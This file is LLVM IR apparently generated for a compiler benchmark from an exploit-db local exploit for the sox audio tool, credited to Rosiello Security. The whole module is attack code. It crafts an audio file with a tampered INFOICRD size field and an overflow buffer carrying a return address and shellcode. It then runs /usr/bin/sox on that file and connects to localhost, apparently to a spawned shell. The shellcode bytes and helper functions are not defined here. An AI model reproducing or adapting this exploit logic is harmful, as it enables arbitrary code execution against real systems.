; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_374.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_374.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32 }

@O_RDWR = common dso_local global i32 0, align 4
@memap = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [40 x i8] c"[+] Sox Exploiter by Rosiello Security\0A\00", align 1
@.str.1 = private unnamed_addr constant [25 x i8] c"[+] Opened %s size : %d\0A\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"INFOICRD\00", align 1
@O_WRONLY = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@O_TRUNC = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [5 x i8] c"open\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"%s%s\00", align 1
@target = common dso_local global %struct.TYPE_2__* null, align 8
@shellcode = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [37 x i8] c"[+] Coded by rave & Angelo Rosiello\0A\00", align 1
@.str.6 = private unnamed_addr constant [31 x i8] c"[+] Writing evil code into %s\0A\00", align 1
@.str.7 = private unnamed_addr constant [43 x i8] c"[+] Org sizefield = %d new sizefield = %d\0A\00", align 1
@.str.8 = private unnamed_addr constant [42 x i8] c"[+] Overflowing the buffer with %d Bytes\0A\00", align 1
@.str.9 = private unnamed_addr constant [28 x i8] c"[+] Executing /usr/bin/sox\0A\00", align 1
@.str.10 = private unnamed_addr constant [29 x i8] c"[+] Connecting to localhost\0A\00", align 1
@.str.11 = private unnamed_addr constant [13 x i8] c"/usr/bin/sox\00", align 1
@.str.12 = private unnamed_addr constant [4 x i8] c"sox\00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"-t\00", align 1
@.str.14 = private unnamed_addr constant [7 x i8] c"ossdsp\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"/dev/dsp\00", align 1
@.str.16 = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@.str.17 = private unnamed_addr constant [20 x i8] c"[-] Exploit failed\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i32, align 4
  %13 = alloca [500 x i8], align 16
  %14 = alloca i64, align 8
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = icmp ne i32 %16, 4
  br i1 %17, label %18, label %23

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 @usage(i8* %21)
  br label %23

23:                                               ; preds = %18, %2
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26)
  store i32 %27, i32* %15, align 4
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = load i32, i32* @O_RDWR, align 4
  %32 = call i8* @fs_io(i8* %30, i32* null, i32 %31, i32* %12)
  store i8* %32, i8** @memap, align 8
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0))
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 1
  %36 = load i8*, i8** %35, align 8
  %37 = load i32, i32* %12, align 4
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0), i8* %36, i32 %37)
  %39 = load i8*, i8** @memap, align 8
  store i8* %39, i8** %6, align 8
  store i32 0, i32* %9, align 4
  br label %40

40:                                               ; preds = %48, %23
  %41 = load i8*, i8** %6, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %6, align 8
  %43 = load i8*, i8** %6, align 8
  %44 = call i64 @strncmp(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i8* %43, i32 8)
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %46, label %47

46:                                               ; preds = %40
  br label %53

47:                                               ; preds = %40
  br label %48

48:                                               ; preds = %47
  %49 = load i32, i32* %9, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %9, align 4
  %51 = load i32, i32* %12, align 4
  %52 = icmp ne i32 %49, %51
  br i1 %52, label %40, label %53

53:                                               ; preds = %48, %46
  %54 = load i32, i32* %12, align 4
  %55 = add nsw i32 %54, 512
  %56 = call i64 @malloc(i32 %55)
  %57 = inttoptr i64 %56 to i8*
  store i8* %57, i8** %7, align 8
  %58 = load i8*, i8** @memap, align 8
  store i8* %58, i8** %7, align 8
  %59 = load i8*, i8** %6, align 8
  %60 = getelementptr inbounds i8, i8* %59, i64 8
  store i8* %60, i8** %6, align 8
  %61 = load i8*, i8** %6, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 0
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i64
  store i64 %64, i64* %10, align 8
  %65 = load i32, i32* %9, align 4
  %66 = add nsw i32 %65, 8
  %67 = sext i32 %66 to i64
  %68 = add nsw i64 %67, 1
  store i64 %68, i64* %11, align 8
  %69 = load i8*, i8** %7, align 8
  %70 = load i64, i64* %11, align 8
  %71 = getelementptr inbounds i8, i8* %69, i64 %70
  store i8 1, i8* %71, align 1
  %72 = load i8*, i8** %7, align 8
  %73 = load i64, i64* %11, align 8
  %74 = add nsw i64 %73, 1
  %75 = getelementptr inbounds i8, i8* %72, i64 %74
  store i8 2, i8* %75, align 1
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 2
  %78 = load i8*, i8** %77, align 8
  %79 = load i32, i32* @O_WRONLY, align 4
  %80 = load i32, i32* @O_CREAT, align 4
  %81 = or i32 %79, %80
  %82 = load i32, i32* @O_TRUNC, align 4
  %83 = or i32 %81, %82
  %84 = call i32 @open(i8* %78, i32 %83, i32 438)
  store i32 %84, i32* %8, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %88

86:                                               ; preds = %53
  %87 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %142

88:                                               ; preds = %53
  %89 = load i64, i64* %11, align 8
  %90 = add nsw i64 %89, 2
  store i64 %90, i64* %11, align 8
  %91 = load i32, i32* %8, align 4
  %92 = load i8*, i8** %7, align 8
  %93 = load i64, i64* %11, align 8
  %94 = trunc i64 %93 to i32
  %95 = call i32 @write(i32 %91, i8* %92, i32 %94)
  %96 = getelementptr inbounds [500 x i8], [500 x i8]* %13, i64 0, i64 0
  %97 = call i32 @memset(i8* %96, i32 46, i32 318)
  %98 = getelementptr inbounds [500 x i8], [500 x i8]* %13, i64 0, i64 0
  %99 = getelementptr inbounds i8, i8* %98, i64 318
  %100 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %101 = load i32, i32* %15, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %100, i64 %102
  %104 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %103, i32 0, i32 0
  %105 = bitcast i32* %104 to i8*
  %106 = load i32, i32* @shellcode, align 4
  %107 = call i32 @sprintf(i8* %99, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i8* %105, i32 %106)
  store i32 %107, i32* %12, align 4
  %108 = load i32, i32* %8, align 4
  %109 = getelementptr inbounds [500 x i8], [500 x i8]* %13, i64 0, i64 0
  %110 = call i32 @write(i32 %108, i8* %109, i32 500)
  %111 = load i32, i32* %8, align 4
  %112 = call i32 @close(i32 %111)
  %113 = load i32, i32* %12, align 4
  %114 = sub nsw i32 258, %113
  store i32 %114, i32* %12, align 4
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.5, i64 0, i64 0))
  %116 = load i8**, i8*** %5, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 2
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.6, i64 0, i64 0), i8* %118)
  %120 = load i64, i64* %10, align 8
  %121 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.7, i64 0, i64 0), i64 %120, i32 258)
  %122 = load i32, i32* %12, align 4
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.8, i64 0, i64 0), i32 %122)
  %124 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.9, i64 0, i64 0))
  %125 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.10, i64 0, i64 0))
  %126 = call i64 (...) @fork()
  store i64 %126, i64* %14, align 8
  %127 = load i64, i64* %14, align 8
  %128 = icmp eq i64 %127, 0
  br i1 %128, label %129, label %134

129:                                              ; preds = %88
  %130 = load i8**, i8*** %5, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 2
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @execl(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* %132, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i64 0, i64 0), i32* null)
  br label %134

134:                                              ; preds = %129, %88
  %135 = call i32 @sleep(i32 1)
  %136 = call i64 @connect_to(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.16, i64 0, i64 0))
  %137 = icmp slt i64 %136, 0
  br i1 %137, label %138, label %140

138:                                              ; preds = %134
  %139 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.17, i64 0, i64 0))
  br label %140

140:                                              ; preds = %138, %134
  %141 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %141, i32* %3, align 4
  br label %142

142:                                              ; preds = %140, %86
  %143 = load i32, i32* %3, align 4
  ret i32 %143
}

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i8* @fs_io(i8*, i32*, i32, i32*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @strncmp(i8*, i8*, i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @open(i8*, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i8*, i32*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i64 @connect_to(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
